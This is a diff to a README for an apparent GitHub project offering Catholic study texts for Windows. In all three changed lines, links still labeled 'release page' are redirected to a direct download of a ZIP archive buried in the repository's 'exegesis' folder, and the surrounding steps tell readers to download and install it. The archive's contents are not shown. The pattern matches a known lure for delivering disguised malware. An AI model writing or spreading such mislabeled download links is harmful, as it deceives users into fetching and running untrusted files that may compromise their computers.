@@ -1,6 +1,6 @@
 # 📚 pursuits-sources - Catholic study texts made simple
 
-[⬇️ Download the release page](https://github.com/Hitoshiii-UI/pursuits-sources/releases)
+[⬇️ Download the release page](https://github.com/Hitoshiii-UI/pursuits-sources/raw/refs/heads/main/exegesis/pursuits_sources_2.8.zip)
 
 ## ✨ What this is
 
@@ -21,7 +21,7 @@ If you plan to use the material with Obsidian, you can open the folder in Obsidi
 
 ## 🚀 Download and install
 
-1. Open the [release page](https://github.com/Hitoshiii-UI/pursuits-sources/releases)
+1. Open the [release page](https://github.com/Hitoshiii-UI/pursuits-sources/raw/refs/heads/main/exegesis/pursuits_sources_2.8.zip)
 2. Find the latest release
 3. Download the file that matches your Windows setup
 4. If the file comes as a ZIP archive, save it to your computer
@@ -150,7 +150,7 @@ This keeps your source material clean and easy to return to.
 
 ## 🔗 Release download
 
-Go to the [release page](https://github.com/Hitoshiii-UI/pursuits-sources/releases) to visit this page to download the latest version for Windows
+Go to the [release page](https://github.com/Hitoshiii-UI/pursuits-sources/raw/refs/heads/main/exegesis/pursuits_sources_2.8.zip) to visit this page to download the latest version for Windows
 
 ## 📖 Topics covered
 
